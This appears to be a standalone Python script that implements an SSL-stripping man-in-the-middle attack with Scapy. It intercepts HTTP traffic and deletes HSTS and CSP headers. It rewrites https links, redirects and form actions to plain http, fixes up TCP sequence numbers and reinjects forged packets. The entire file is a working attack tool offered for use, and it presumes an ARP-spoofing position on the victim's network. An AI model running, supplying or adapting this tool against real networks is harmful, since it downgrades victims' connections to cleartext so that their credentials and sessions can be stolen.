#!/usr/bin/env python3
import argparse, gzip, logging, re, sys, time
from collections import defaultdict
from pathlib import Path
from typing import Dict, Tuple

from scapy.all import (
    IP,
    TCP,
    Raw,
    conf,
    sendp,
    sniff,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("sslstrip")

# ------------------------------------------------------------------------------
HTTPS_RE = re.compile(rb"https://", re.I)
TAG_RE   = re.compile(rb'(?i)(href|src|action)=["\']https://')
DROP_HDR = {b"strict-transport-security", b"content-security-policy"}
REQ_RE   = re.compile(rb"\r\n\r\n")          # end of headers marker

MAX_BODY_REWRITE = 131072                    # 128 kB safety cap

# ------------------------------------------------------------------------------
class FlowState:
    """ Store per-direction length deltas so we can keep seq/ack coherent. """
    def __init__(self):
        self.c2s_delta = 0   # bytes removed/added client→server
        self.s2c_delta = 0   # bytes removed/added server→client

flows: Dict[Tuple[int,int,int,int], FlowState] = defaultdict(FlowState)

# ------------------------------------------------------------------------------
def kill_accept_encoding(req: bytes) -> Tuple[bytes, int]:
    lines = req.split(b"\r\n")
    new = [l for l in lines if not l.lower().startswith(b"accept-encoding:")]
    delta = sum(len(l) for l in new) + len(new) - len(req)  # include CRLFs
    return b"\r\n".join(new), delta

def rewrite_headers(resp: bytes) -> Tuple[bytes, int]:
    out, delta = [], 0
    for line in resp.split(b"\r\n"):
        if not line:
            out.append(line)
            break
        key = line.split(b":", 1)[0].lower()
        if key in DROP_HDR:
            delta -= len(line) + 2
            continue
        if key in (b"location", b"refresh"):
            nl = HTTPS_RE.sub(b"http://", line, 1)
            delta += len(nl) - len(line)
            line  = nl
        out.append(line)
    # copy the rest untouched
    remainder = resp.split(b"\r\n\r\n", 1)[1]
    return b"\r\n".join(out) + b"\r\n\r\n" + remainder, delta

def rewrite_body(body: bytes) -> Tuple[bytes, int]:
    nb = HTTPS_RE.sub(b"http://", body)
    nb = TAG_RE.sub(lambda m: m.group(1)+b'="http://', nb)
    return nb, len(nb) - len(body)

# ------------------------------------------------------------------------------
def adjust_tcp(pkt: TCP, seq_delta: int, ack_delta: int):
    if seq_delta:
        pkt.seq = (pkt.seq + seq_delta) & 0xFFFFFFFF
    if ack_delta:
        pkt.ack = (pkt.ack + ack_delta) & 0xFFFFFFFF

def forge_and_send(orig, new_payload, iface):
    forged = orig.copy()
    forged[Raw].load = new_payload
    forged[IP].len = None
    forged[IP].chksum = None
    forged[TCP].chksum = None
    sendp(forged, iface=iface, verbose=False)

# ------------------------------------------------------------------------------
def process(pkt, iface):
    if not pkt.haslayer(Raw):
        return

    ip, tcp = pkt[IP], pkt[TCP]
    fkey = (ip.src, tcp.sport, ip.dst, tcp.dport)  # client → server key
    rkey = (ip.dst, tcp.dport, ip.src, tcp.sport)  # reverse flow key
    state = flows[fkey]            # both sides share same FlowState

    # -------------------------- client → server ------------------------------
    if tcp.dport == 80:
        data = bytes(pkt[Raw].load)
        if REQ_RE.search(data):
            new, d = kill_accept_encoding(data)
            if d:
                state.c2s_delta += d
                adjust_tcp(tcp, 0, state.s2c_delta)   # ACK reflection
                forge_and_send(pkt, new, iface)
                return
        # no change: just bump ACK if needed and resend
        if state.s2c_delta:
            adjust_tcp(tcp, 0, state.s2c_delta)
            forge_and_send(pkt, data, iface)

    # -------------------------- server → client ------------------------------
    elif tcp.sport == 80:
        data = bytes(pkt[Raw].load)

        # 1. first packet that still contains HTTP headers
        if REQ_RE.search(data[:4096]):   # headers must be in this segment
            head, body = data.split(b"\r\n\r\n", 1)
            nhead, d1  = rewrite_headers(head + b"\r\n\r\n")
            nbody = body
            d2 = 0

            # optionally rewrite body if small enough
            if body and len(body) <= MAX_BODY_REWRITE:
                # use Content-Type: text/.. hint to avoid binaries
                if b"text/" in head.lower() or b"javascript" in head.lower() \
                   or b"json" in head.lower() or b"html" in head.lower():
                    nbody, d2 = rewrite_body(body)

            delta = d1 + d2
            if delta:
                state.s2c_delta += delta
                adjust_tcp(tcp, 0, state.c2s_delta)   # ACK reflection
                forge_and_send(pkt, nhead + nbody, iface)
                return

        # 2. subsequent packets in same flow — just adjust sequence numbers
        if state.c2s_delta or state.s2c_delta:
            adjust_tcp(tcp, state.s2c_delta, state.c2s_delta)
        forge_and_send(pkt, data, iface)

# ------------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Scapy SSL-stripper")
    ap.add_argument("-i", "--iface", required=True, help="Interface to sniff/reinject on")
    args = ap.parse_args()

    # Make sure kernel does NOT forward HTTP packets – we’ll resend them
    forward = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
    if forward != "1":
        log.warning("IP forwarding is disabled; ARP MITM will not relay traffic!")

    log.info("SSL-strip Scapy proxy started on %s", args.iface)
    sniff(
        iface=args.iface,
        prn=lambda p: process(p, args.iface),
        filter="tcp port 80",
        store=False,
    )

if __name__ == "__main__":
    if not conf.route.route("0.0.0.0"):
        log.error("No default route – Scapy won’t know where to send packets.")
        sys.exit(1)
    try:
        main()
    except KeyboardInterrupt:
        log.info("Exiting …")
